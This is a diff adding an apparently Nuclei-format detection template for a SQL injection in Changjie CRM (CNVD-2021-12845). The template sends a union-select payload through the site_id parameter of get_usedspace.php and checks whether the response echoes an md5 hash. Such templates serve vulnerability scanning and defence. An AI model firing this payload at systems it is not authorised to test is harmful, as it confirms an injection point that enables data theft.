@@ -1,0 +1,24 @@
+id: changjie-crm-sqli-cnvd-2021-12845
+info:
+  name: Changjie CRM SQL Injection Vulnerability (CNVD-2021-12845)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,CNVD-2021-12845
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{t1}}))"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<result>{{t2}}</result>"
